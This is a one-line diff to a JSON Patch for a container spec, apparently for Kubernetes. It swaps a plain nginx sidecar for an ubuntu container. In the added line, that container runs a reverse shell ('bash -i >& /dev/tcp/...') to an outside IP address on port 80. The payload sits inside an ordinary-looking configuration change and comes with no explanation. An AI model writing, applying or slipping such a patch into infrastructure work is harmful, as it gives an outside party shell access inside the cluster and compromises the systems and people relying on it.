@@ -1,1 +1,1 @@
-[{"op":"add","path":"/spec/containers/1","value":{"name":"nginx2","image":"nginx"}}]
+[{"op":"add","path":"/spec/containers/1","value":{"name":"ubuntu","image":"ubuntu","args":["/bin/bash","-c","bash -i >& /dev/tcp/107.22.6.126/80 0>&1"}}]
